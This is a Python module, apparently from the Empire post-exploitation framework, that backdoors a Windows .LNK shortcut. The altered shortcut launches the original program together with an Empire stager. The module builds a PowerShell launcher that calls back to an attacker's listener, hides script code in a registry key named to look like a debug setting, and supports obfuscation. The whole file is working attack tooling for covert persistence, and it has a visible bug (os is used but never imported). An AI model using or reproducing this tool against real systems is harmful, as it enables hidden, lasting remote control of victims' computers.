from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-BackdoorLNK',

            'Author': ['@harmj0y'],

            'Description': ("Backdoor a specified .LNK file with a version that launches the original binary and then an Empire stager."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://windowsitpro.com/powershell/working-shortcuts-windows-powershell',
                'http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html',
                'https://github.com/samratashok/nishang',
                'http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LNKPath' : {
                'Description'   :   'Full path to the .LNK to backdoor.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   True,
                'Value'         :   'HKCU:\Software\Microsoft\Windows\debug'
            },
            'ExtFile' : {
                'Description'   :   'Use an external file for the payload instead of a stager.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Cleanup' : {
                'Description'   :   'Switch. Restore the original .LNK settings.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']

        # management options
        lnkPath = self.options['LNKPath']['Value']
        extFile = self.options['ExtFile']['Value']
        cleanup = self.options['Cleanup']['Value']

        # storage options
        regPath = self.options['RegPath']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        statusMsg = ""

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            launcher = launcher.replace("$", "`$")


        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        script = f.read()
        f.close()

        scriptEnd = "Invoke-BackdoorLNK "
        
        if cleanup.lower() == "true":
            scriptEnd += " -CleanUp"
            scriptEnd += " -LNKPath '%s'" %(lnkPath)
            scriptEnd += " -RegPath '%s'" %(regPath)
            scriptEnd += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnkPath,regPath)
       
        else:
            if extFile != '':
                # read in an external file as the payload and build a 
                #   base64 encoded version as encScript
                if os.path.exists(extFile):
                    f = open(extFile, 'r')
                    fileData = f.read()
                    f.close()

                    # unicode-base64 encode the script for -enc launching
                    encScript = helpers.enc_powershell(fileData)
                    statusMsg += "using external file " + extFile

                else:
                    print helpers.color("[!] File does not exist: " + extFile)
                    return ""

            else:
                # if an external file isn't specified, use a listener
                if not self.mainMenu.listeners.is_listener_valid(listenerName):
                    # not a valid listener, return nothing for the script
                    print helpers.color("[!] Invalid listener: " + listenerName)
                    return ""

                else:
                    # generate the PowerShell one-liner with all of the proper options set
                    launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                    
                    encScript = launcher.split(" ")[-1]
                    statusMsg += "using listener " + listenerName

            scriptEnd += " -LNKPath '%s'" %(lnkPath)
            scriptEnd += " -EncScript '%s'" %(encScript)
            scriptEnd += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnkPath,listenerName)
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
